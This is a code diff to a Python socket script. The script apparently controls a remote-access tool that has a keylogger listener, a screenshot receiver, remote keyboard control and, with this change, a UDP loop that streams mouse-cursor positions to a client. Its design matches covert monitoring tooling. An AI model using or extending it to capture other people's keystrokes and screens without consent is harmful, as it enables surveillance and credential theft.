@@ -3,6 +3,9 @@ from PIL import Image, ImageTk
 import tkinter as tk
 import io
 import keyboard
+import win32api
+import time
+import json
 host = '127.0.0.1'
 def start_keylogger_listener():
     port = 5000
@@ -39,6 +42,20 @@ def start_keyboard_control():
             print(f"Key pressed: {key_name}")
             message = key_name
             client_socket.sendall(message.encode())
+def start_mouse_control():
+    port = 5002
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    server_socket.bind((host,port))
+    print(f"Listening on {host}:{port}")
+    data , client_addr = server_socket.recvfrom(1024)
+    print(f"Connection established with {client_addr}, And the message was{data.decode()}")
+    while True:
+        (X,Y) = win32api.GetCursorPos()
+        mouselocation = (X, Y)
+        json_data = json.dumps(mouselocation).encode()
+        server_socket.sendto(json_data,(client_addr))
+        print("data sent to ", client_addr)
+        time.sleep(1)
 
 def receive_screenshot():
     port = 5003
@@ -55,7 +72,8 @@ def receive_screenshot():
 
 
 def main():
-    start_keyboard_control()
+    start_mouse_control()
+    #start_keyboard_control()
     #start_keylogger_listener()
     #receive_screenshot()
 if __name__ == "__main__":
